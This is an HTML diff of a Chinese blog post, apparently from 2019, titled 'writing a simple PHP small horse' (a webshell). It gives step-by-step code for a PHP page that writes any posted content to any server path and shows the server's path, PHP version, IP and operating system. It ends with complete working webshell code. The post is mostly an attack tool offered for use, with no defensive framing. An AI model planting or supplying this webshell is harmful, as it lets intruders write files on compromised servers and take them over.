@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="只因不值得">
+  <meta name="keywords" content="">
+  <title>PHP简易小马编写 - 只因不值得</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>只因不值得</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">分类</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    944 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      5 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+              <p
+                class="note note-warning">本文最后更新于：2019 , 六月 9日 星期日, 2:31 下午</p>
+            
+            <div class="markdown-body">
+              <h2 id="大概页面"><a href="#大概页面" class="headerlink" title="大概页面"></a>大概页面</h2><p>一个是你需要保存的文件地址<br>一个是你提交数据的<br>一个提交数据的按钮</p>
+<pre><code class="html">&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;&lt;/title&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;
+    上传路径: &lt;input type=&#39;text&#39; name=&#39;path&#39; tyle=&quot;width:400px&quot; value=&quot;&lt;?php echo __DIR__.&quot;\\&quot;;?&gt;&quot; /&gt;&lt;br&gt;&gt;
+    提交内容&lt;br&gt;
+    &lt;textarea name=&#39;comm&#39; rows=&quot;10&quot; cols=&quot;54&quot;&gt;&lt;/textarea&gt;&lt;br&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;write&quot;&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p><img src="/images/Web/webshell/PHP%E7%AE%80%E6%98%93%E5%B0%8F%E9%A9%AC%E7%BC%96%E5%86%99/0.png" srcset="/img/loading.gif" alt=""></p>
+<a id="more"></a>
+
+
+<h2 id="上传功能实现"><a href="#上传功能实现" class="headerlink" title="上传功能实现"></a>上传功能实现</h2><p>判断以path和comm命名的数据不能为空<br><code>if (isset($_POST[&quot;path&quot;]) &amp;&amp; isset($_POST[&quot;comm&quot;])){}</code><br>不为空写入数据</p>
+<pre><code class="php">&lt;?php
+if (isset($_POST[&quot;path&quot;]) &amp;&amp; isset($_POST[&quot;comm&quot;])){
+    $getpath = fopen($_POST[&quot;path&quot;],&quot;a&quot;);
+    if(!$getpath){
+        echo &quot;写入失败！请换个目录试试！&quot;;
+    }else{
+        fputs($getpath,$_POST[&quot;comm&quot;]);
+        fclose($getpath);
+        echo &quot;上传: OK !&quot;;
+    }
+}
+?&gt;</code></pre>
+<h2 id="添加显示我们一般需要的数据"><a href="#添加显示我们一般需要的数据" class="headerlink" title="添加显示我们一般需要的数据"></a>添加显示我们一般需要的数据</h2><p>当前路径 <code>__FILE__</code><br>PHP版本 <code>PHP_VERSION</code><br>IP地址 <code>gethostbyname($_SERVER[&quot;SERVER_NAME&quot;])</code><br>操作系统 <code>PHP_OS</code></p>
+<p>这些数据我们用 表格显示</p>
+<pre><code class="php">&lt;?php 
+echo &#39;&lt;table border=&quot;1&quot; width=&quot;600&quot;&gt;&#39;;
+echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;
+echo &#39;&lt;th&gt;当前路径&lt;/th&gt;&lt;th&gt;&#39;,__FILE__,&#39;&lt;/th&gt;&#39;;
+echo &#39;&lt;/tr&gt;&#39;;
+echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;
+echo &#39;&lt;th&gt;PHP版本&lt;/th&gt;&lt;th&gt;&#39;,PHP_VERSION,&#39;&lt;/th&gt;&#39;;
+echo &quot;&lt;/tr&gt;&quot;;
+echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;
+echo &#39;&lt;th&gt;IP地址&lt;/th&gt;&lt;th&gt;&#39;,gethostbyname($_SERVER[&quot;SERVER_NAME&quot;]),&#39;&lt;/th&gt;&#39;;
+echo &quot;&lt;/tr&gt;&quot;;
+echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;
+echo &#39;&lt;th&gt;操作系统&lt;/th&gt;&lt;th&gt;&#39;,PHP_OS,&#39;&lt;/th&gt;&#39;;
+echo &quot;&lt;/tr&gt;&quot;;
+echo &quot;&lt;/table&gt;&quot;
+?&gt;</code></pre>
+<p><img src="/images/Web/webshell/PHP%E7%AE%80%E6%98%93%E5%B0%8F%E9%A9%AC%E7%BC%96%E5%86%99/1.png" srcset="/img/loading.gif" alt=""></p>
+<p>到此我们非常简易的小马就写好了,接下来就是稍微美化下<br>毕竟美观很重要</p>
+<h2 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h2><p>背景设置为黑<code>&lt;body bgcolor=&quot;#000&quot;&gt;</code><br>字体设置为红色<code>&lt;form action=&quot;&quot; method=&quot;POST&quot; style=&quot;color:red;&quot;&gt;</code><br>添加<code>hr</code>划分<code>&lt;hr&gt;</code></p>
+<h2 id="最终代码及效果图"><a href="#最终代码及效果图" class="headerlink" title="最终代码及效果图"></a>最终代码及效果图</h2><pre><code class="php">&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;sunsky&lt;/title&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;/head&gt;
+&lt;body bgcolor=&quot;#000&quot;&gt;
+    &lt;form action=&quot;&quot; method=&quot;POST&quot; style=&quot;color:red;&quot;&gt;
+    &lt;?php 
+    echo &#39;&lt;table border=&quot;1&quot; width=&quot;600&quot;&gt;&#39;;
+    echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;
+    echo &#39;&lt;th&gt;当前路径&lt;/th&gt;&lt;th&gt;&#39;,__FILE__,&#39;&lt;/th&gt;&#39;;
+    echo &#39;&lt;/tr&gt;&#39;;
+    echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;
+    echo &#39;&lt;th&gt;PHP版本&lt;/th&gt;&lt;th&gt;&#39;,PHP_VERSION,&#39;&lt;/th&gt;&#39;;
+    echo &quot;&lt;/tr&gt;&quot;;
+    echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;
+    echo &#39;&lt;th&gt;IP地址&lt;/th&gt;&lt;th&gt;&#39;,gethostbyname($_SERVER[&quot;SERVER_NAME&quot;]),&#39;&lt;/th&gt;&#39;;
+    echo &quot;&lt;/tr&gt;&quot;;
+    echo &#39;&lt;tr bgcolor=&quot;#dddddd&quot;&gt;&#39;;
+    echo &#39;&lt;th&gt;操作系统&lt;/th&gt;&lt;th&gt;&#39;,PHP_OS,&#39;&lt;/th&gt;&#39;;
+    echo &quot;&lt;/tr&gt;&quot;;
+    echo &quot;&lt;/table&gt;&quot;;?&gt;
+    &lt;hr&gt;
+    上传路径:&lt;input type=&#39;text&#39; name=&#39;path&#39; style=&quot;width:400px&quot; value=&quot;&lt;?php echo __DIR__.&quot;\\&quot;;?&gt;&quot; /&gt;&lt;br&gt;
+    提交数据&lt;br&gt;
+    &lt;textarea name=&#39;comm&#39; rows=&quot;10&quot; cols=&quot;54&quot;&gt;&lt;/textarea&gt;&lt;br&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;write&quot;&gt;
+    &lt;hr&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;?php
+if (isset($_POST[&quot;path&quot;]) &amp;&amp; isset($_POST[&quot;comm&quot;])){
+    $getpath = fopen($_POST[&quot;path&quot;],&quot;a&quot;);
+    if(!$getpath){
+        echo &quot;写入失败！请换个目录试试！&quot;;
+    }else{
+        fputs($getpath,$_POST[&quot;comm&quot;]);
+        fclose($getpath);
+        echo &quot;上传: OK !&quot;;
+    }
+}
+?&gt;</code></pre>
+<p><img src="/images/Web/webshell/PHP%E7%AE%80%E6%98%93%E5%B0%8F%E9%A9%AC%E7%BC%96%E5%86%99/2.png" srcset="/img/loading.gif" alt=""><br><img src="/images/Web/webshell/PHP%E7%AE%80%E6%98%93%E5%B0%8F%E9%A9%AC%E7%BC%96%E5%86%99/3.png" srcset="/img/loading.gif" alt=""></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>i春秋论坛: <a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=12774&amp;highlight=编写" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=12774&amp;highlight=编写</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Web/">Web</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/08/18/Web/Robots%E5%8D%8F%E8%AE%AE/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>【学习篇】Robots协议(也称为爬虫协议，机器人协议)</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/08/18/Web/NetCat%E8%AF%A6%E8%A7%A3%E5%8F%82%E6%95%B0/">
+                        <span>NetCat命令详解</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a rel="nofollow noopener"><b>2018</b></a>
+      <i class="fab fa-angular"></i>
+      <a rel="nofollow noopener"> <b>只因不值得</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  ');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "PHP简易小马编写&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
